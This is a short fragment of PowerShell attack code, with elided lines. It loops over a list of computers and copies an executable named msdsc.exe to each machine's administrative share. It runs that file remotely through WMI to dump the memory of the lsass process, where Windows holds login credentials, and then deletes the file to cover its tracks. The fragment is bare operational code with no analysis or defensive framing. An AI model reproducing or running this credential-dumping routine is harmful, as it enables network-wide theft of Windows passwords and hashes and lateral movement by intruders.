...
if(![string]::IsNullOrEmpty($colComputers)) {
    ...
    foreach ($strComputer in $colComputers){    
        ...
        Copy-Item -Path "$scriptPath\msdsc.exe" -Destination "\\$strComputer\c$\windows\temp\msdsc.exe"
        $dumpAProcessPath = "C:\Windows\temp\msdsc.exe"
        Run-WmiRemoteProcess $strComputer "$dumpAProcessPath lsass c:\windows\temp" | Wait-Process
        ...
        Remove-Item -Force "\\$strComputer\c$\windows\temp\msdsc.exe"
